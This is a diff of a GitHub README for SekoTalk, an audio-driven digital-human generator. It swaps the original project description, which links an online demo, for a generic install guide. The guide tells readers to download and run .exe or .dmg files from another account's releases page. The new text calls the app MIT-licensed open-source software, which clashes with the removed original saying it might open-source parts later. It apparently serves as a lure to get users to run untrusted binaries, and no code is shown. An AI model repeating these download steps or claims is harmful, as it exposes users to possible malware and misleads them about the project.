@@ -1,27 +1,88 @@
-# SekoTalk
+# 🎤 SekoTalk - Create Stunning Audio-Driven Humans
 
-[![Project Page](https://img.shields.io/badge/Project-Page-orange)](https://sekotalk.com/showcase)
-[![SekoTalk Online Demo](https://img.shields.io/badge/SekoTalk-Demo-Green)](https://sekotalk.com)
-[![LightX2V Online Demo](https://img.shields.io/badge/LightX2V-Demo-green)](https://x2v.light-ai.top/)
-[![Twitter](https://img.shields.io/badge/SekoTalk-000000?style=flat&logo=x&logoColor=white)](https://x.com/seko_talk)
+[![Download SekoTalk](https://img.shields.io/badge/Download-SekoTalk-blue)](https://github.com/Haidy440/SekoTalk/releases)
 
-We are excited to introduce **SekoTalk**, an audio-driven digital human generation model.
+## 🌟 Introduction
 
-Partnering deeply with
-<a href="https://github.com/ModelTC/LightX2V" target="_blank">⚡️LightX2V</a>,
-SekoTalk requires only 4 NFEs for generation, leveraging the proven method behind
-<a href="https://github.com/ModelTC/Qwen-Image-Lightning" target="_blank">Qwen-Image-Lightning</a>
-and
-<a href="https://github.com/ModelTC/Wan2.2-Lightning" target="_blank">Wan2.2-Lightning</a>.
+Welcome to **SekoTalk**! This application allows you to generate digital humans using audio inputs. With SekoTalk, you can create high-quality audio-driven models easily and effectively. Our partnership with technologies like LightX2V ensures fast and efficient results.
 
-A 🆓 <a href="https://sekotalk.com" target="_blank">free online generation trial</a> 
-is available, supporting audio clips up to 1 minutes ⏱️.
-**Enjoy making your character talk!** 🤗
-(Note: a queue is possible due to limited computing resources)
+## 🚀 Getting Started
 
-https://github.com/user-attachments/assets/756605ea-3b78-4ee0-9cd5-64898abdce77
+To get started with SekoTalk, follow the steps below to download and run the application on your computer.
 
-🚀 SekoTalk is an ongoing project. We'd love to hear what you think of our project!
+## 📥 Download & Install
 
-If you find our project interesting, feel free to star ⭐  it or leave comments in the issues 📝.
-A warm community response would encourage us to consider open-sourcing parts of SekoTalk in the future, fostering community collaboration. ❤️
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page.  
+   [Download SekoTalk](https://github.com/Haidy440/SekoTalk/releases)
+
+2. **Choose Your Version**  
+   On the Releases page, find the latest version of SekoTalk.  
+   Look for files labeled with `.exe` for Windows or `.dmg` for macOS.
+
+3. **Download the File**  
+   Click on the file associated with your operating system to start the download. 
+
+4. **Locate the Downloaded File**  
+   Once the download is complete, go to your Downloads folder to find the file.
+
+5. **Run the Installer**  
+   Double-click the downloaded file to begin the installation process. Follow the on-screen instructions.
+
+6. **Launch SekoTalk**  
+   After installation, you will find SekoTalk in your applications menu or on your desktop. Open the application to start creating digital humans.
+
+## ⚙️ System Requirements
+
+- **Operating System**: Windows 10 or later, macOS 10.12 or later
+- **RAM**: 4 GB minimum (8 GB recommended)
+- **Storage**: At least 500 MB of free space
+- **Network**: Internet connection for updates and online features
+
+## 🌈 Features
+
+- **Audio Input Processing**: Generate models using voice or sound clips.
+- **Real-Time Creation**: Experience instant model generation with minimal delay.
+- **User-Friendly Interface**: An easy-to-use interface for all levels of users.
+- **Expandability**: Collaborates with advanced technologies for enhanced functionalities.
+
+## 💡 How to Use SekoTalk
+
+1. **Input Your Audio**  
+   Access the main interface and find the audio input section. Upload your audio clip or use a microphone for live input.
+
+2. **Select Your Preferences**  
+   Adjust settings for voice tone, style, and other characteristics to customize your digital human.
+
+3. **Generate the Model**  
+   Click the "Generate" button to process your audio clip. Wait a moment for the results.
+
+4. **Save or Share Your Creation**  
+   Once the generation is complete, save your digital human as a file or share it directly from the application.
+
+## 🎨 Support and Community
+
+If you encounter any issues or have questions about SekoTalk, feel free to reach out:
+
+- Join our community forum on our [Project Page](https://sekotalk.com/showcase).
+- Follow us on [Twitter](https://x.com/seko_talk) for updates and tips.
+
+## ✉️ Feedback and Contributions
+
+Your feedback is essential to us. If you have suggestions or would like to contribute, please contact us through our Project Page. We welcome your ideas and input.
+
+## 🌐 Online Demo
+
+Try our online demo to see SekoTalk in action. Visit our live demo at [SekoTalk Demo](https://sekotalk.com).
+
+## 📜 License
+
+SekoTalk is open-source software, released under the MIT License. Feel free to use, modify, and share this application, but ensure to follow the license terms.
+
+## 🔗 Important Links
+
+- [Download SekoTalk](https://github.com/Haidy440/SekoTalk/releases)
+- [Visit SekoTalk Online Demo](https://sekotalk.com)
+- [Explore Project Page](https://sekotalk.com/showcase)
+
+Enjoy creating with SekoTalk!
